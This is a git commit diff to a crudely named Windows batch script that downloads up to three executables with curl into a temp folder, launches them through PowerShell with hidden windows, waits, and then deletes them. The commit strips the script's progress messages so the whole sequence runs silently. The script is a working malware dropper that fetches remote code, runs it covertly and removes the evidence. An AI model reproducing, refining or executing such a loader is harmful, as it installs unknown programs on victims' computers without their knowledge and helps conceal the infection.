11991f5ea0e822350228417b01f700a4b5f24143
blechbleh <blueyyy@yooblueyyy.info>
2025-11-30 11:09:04 -0800

    Update penis.bat

--- penis.bat
+++ penis.bat
@@ -13,13 +13,9 @@ set TEMP_DIR=%TEMP%\gt_temp
 
 if not exist "%TEMP_DIR%" mkdir "%TEMP_DIR%"
 
-echo Downloading EXEs...
-
 if defined EXE_URL1 curl -L -o "%TEMP_DIR%\%EXE_NAME1%" %EXE_URL1%
 if defined EXE_URL2 curl -L -o "%TEMP_DIR%\%EXE_NAME2%" %EXE_URL2%
 if defined EXE_URL3 curl -L -o "%TEMP_DIR%\%EXE_NAME3%" %EXE_URL3%
-
-echo Running EXEs silently...
 
 if exist "%TEMP_DIR%\%EXE_NAME1%" powershell -WindowStyle Hidden -Command "Start-Process '%TEMP_DIR%\%EXE_NAME1%' -WindowStyle Hidden"
 if exist "%TEMP_DIR%\%EXE_NAME2%" powershell -WindowStyle Hidden -Command "Start-Process '%TEMP_DIR%\%EXE_NAME2%' -WindowStyle Hidden"
@@ -27,9 +23,5 @@ if exist "%TEMP_DIR%\%EXE_NAME3%" powershell -WindowStyle Hidden -Command "Start
 
 timeout /t 5 >nul
 
-echo Cleaning up...
 del "%TEMP_DIR%\*.exe" >nul 2>&1
 rd "%TEMP_DIR%" 2>nul
-
-echo Done.
-
